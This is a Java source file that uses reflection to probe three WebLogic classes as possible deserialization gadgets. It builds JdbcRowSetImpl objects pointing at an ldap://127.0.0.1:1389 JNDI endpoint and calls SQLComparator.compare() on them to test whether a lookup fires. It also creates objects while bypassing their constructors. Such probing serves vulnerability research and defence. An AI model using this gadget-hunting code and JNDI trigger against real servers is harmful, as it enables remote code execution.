import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class DeepInspect {
    public static void main(String[] args) throws Exception {
        System.out.println("=== Deep Inspection ===\n");

        inspectWL6();
        inspectWL7();
        inspectWL8();
    }

    static void inspectWL6() throws Exception {
        System.out.println("[WL6] BufferingConfig$Queue deep inspection");
        Class<?> queueClass = Class.forName("weblogic.wsee.jaxws.buffer.BufferingConfig$Queue");

        System.out.println("  Methods (non-Object):");
        for (Method m : queueClass.getMethods()) {
            if (m.getDeclaringClass() == Object.class) continue;
            System.out.println("    " + m.getReturnType().getSimpleName() + " " + m.getName()
                + "(" + m.getParameterCount() + " params)");
        }

        for (Field f : queueClass.getDeclaredFields()) {
            f.setAccessible(true);
            System.out.println("  Field: " + f.getType().getName() + " " + f.getName());
        }

        // Check readObject
        try {
            Method readObj = queueClass.getDeclaredMethod("readObject", ObjectInputStream.class);
            System.out.println("  readObject(): EXISTS");
        } catch (NoSuchMethodException e) {
            System.out.println("  readObject(): not found (default serialization)");
        }

        // Check for JNDI-triggering methods in the class hierarchy
        Class<?> curr = queueClass;
        while (curr != null && curr != Object.class) {
            for (Method m : curr.getDeclaredMethods()) {
                String name = m.getName().toLowerCase();
                if (name.contains("jndi") || name.contains("lookup") || name.contains("connect")
                    || name.contains("init") || name.contains("start") || name.contains("resolve")) {
                    System.out.println("  Interesting method in " + curr.getSimpleName() + ": " + m.getName());
                }
            }
            curr = curr.getSuperclass();
        }

        // Check the enclosing BufferingConfig class
        Class<?> enclosing = queueClass.getEnclosingClass();
        if (enclosing != null) {
            System.out.println("  Enclosing: " + enclosing.getName());
            for (Method m : enclosing.getDeclaredMethods()) {
                String name = m.getName().toLowerCase();
                if (name.contains("jndi") || name.contains("lookup") || name.contains("create")
                    || name.contains("queue") || name.contains("init")) {
                    System.out.println("    " + m.getReturnType().getSimpleName() + " " + m.getName()
                        + "(" + m.getParameterCount() + ")");
                }
            }
        }
        System.out.println();
    }

    static void inspectWL7() throws Exception {
        System.out.println("[WL7] SQLComparator deep inspection");
        Class<?> sqlCompClass = Class.forName("weblogic.jdbc.rowset.SQLComparator");

        System.out.println("  Fields:");
        for (Field f : sqlCompClass.getDeclaredFields()) {
            f.setAccessible(true);
            System.out.println("    " + f.getType().getSimpleName() + " " + f.getName());
        }

        // Check constructors
        System.out.println("  Constructors:");
        for (Constructor<?> c : sqlCompClass.getDeclaredConstructors()) {
            System.out.println("    " + java.util.Arrays.toString(c.getParameterTypes()));
        }

        // Try to understand compare() - what does it call on the objects?
        Object sqlComp = createWithoutConstructor(sqlCompClass);
        if (sqlComp == null) {
            System.out.println("  FAIL: Cannot create SQLComparator");
            return;
        }
        Field colsField = sqlCompClass.getDeclaredField("cols");
        colsField.setAccessible(true);

        // Try with 1 column
        ArrayList<Object> cols = new ArrayList<>();
        cols.add(Integer.valueOf(1));  // column index 1
        colsField.set(sqlComp, cols);

        System.out.println("  Testing with cols=[1] and JdbcRowSetImpl...");
        @SuppressWarnings("unchecked")
        Comparator<Object> comp = (Comparator<Object>) sqlComp;

        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class)
            .invoke(jrs1, "ldap://127.0.0.1:1389/WL7_TEST");

        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class)
            .invoke(jrs2, "ldap://127.0.0.1:1389/WL7_TEST2");

        try {
            comp.compare(jrs1, jrs2);
            System.out.println("  compare() returned normally");
        } catch (Throwable e) {
            System.out.println("  Exception: " + e.getClass().getName() + ": " + truncate(e.getMessage(), 200));
            Throwable cause = e.getCause();
            int depth = 0;
            while (cause != null && depth < 5) {
                System.out.println("  Caused by: " + cause.getClass().getName() + ": " + truncate(cause.getMessage(), 200));
                cause = cause.getCause();
                depth++;
            }
        }

        // Also try with column 0
        cols.clear();
        cols.add(Integer.valueOf(0));
        colsField.set(sqlComp, cols);
        System.out.println("  Testing with cols=[0]...");
        try {
            comp.compare(jrs1, jrs2);
            System.out.println("  compare() returned normally");
        } catch (Throwable e) {
            System.out.println("  Exception: " + e.getClass().getName() + ": " + truncate(e.getMessage(), 200));
            Throwable cause = e.getCause();
            int depth = 0;
            while (cause != null && depth < 5) {
                System.out.println("  Caused by: " + cause.getClass().getName() + ": " + truncate(cause.getMessage(), 200));
                cause = cause.getCause();
                depth++;
            }
        }

        // Check what interface the compare() method expects
        System.out.println("  Implemented interfaces:");
        for (Class<?> iface : sqlCompClass.getInterfaces()) {
            System.out.println("    " + iface.getName());
        }

        // Check if it expects RowSet, ResultSet, or some WL-specific type
        System.out.println("  Parent classes:");
        Class<?> p = sqlCompClass.getSuperclass();
        while (p != null && p != Object.class) {
            System.out.println("    " + p.getName());
            p = p.getSuperclass();
        }
        System.out.println();
    }

    static void inspectWL8() throws Exception {
        System.out.println("[WL8] WebLogicAttribute$NullObject deep inspection");
        Class<?> nullObjClass = Class.forName("weblogic.management.internal.WebLogicAttribute$NullObject");

        Method readResolve = nullObjClass.getDeclaredMethod("readResolve");
        readResolve.setAccessible(true);

        System.out.println("  readResolve() return type: " + readResolve.getReturnType().getName());

        Object nullObj = createWithoutConstructor(nullObjClass);
        try {
            Object result = readResolve.invoke(nullObj);
            System.out.println("  readResolve() returned: " + (result == null ? "null" : result.getClass().getName()));
            System.out.println("  Same instance? " + (result == nullObj));
            // If it returns static singleton, this is not exploitable
            Field itField = nullObjClass.getDeclaredField("it");
            itField.setAccessible(true);
            Object staticIt = itField.get(null);
            System.out.println("  Static 'it' == result? " + (staticIt == result));
            System.out.println("  VERDICT: " + (staticIt == result ? "Singleton pattern - NOT directly exploitable" : "Different object - INVESTIGATE"));
        } catch (Exception e) {
            System.out.println("  readResolve() threw: " + e);
        }
        System.out.println();
    }

    static Object createWithoutConstructor(Class<?> clazz) {
        try {
            Class<?> rfClass = Class.forName("sun.reflect.ReflectionFactory");
            Method getFactory = rfClass.getMethod("getReflectionFactory");
            Object rf = getFactory.invoke(null);
            Method newCSFA = rfClass.getMethod("newConstructorForSerialization",
                Class.class, Constructor.class);
            Constructor<?> objCtor = Object.class.getDeclaredConstructor();
            Constructor<?> ctor = (Constructor<?>) newCSFA.invoke(rf, clazz, objCtor);
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (Exception e) {
            try {
                Constructor<?> c = clazz.getDeclaredConstructor();
                c.setAccessible(true);
                return c.newInstance();
            } catch (Exception e2) { return null; }
        }
    }

    static String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
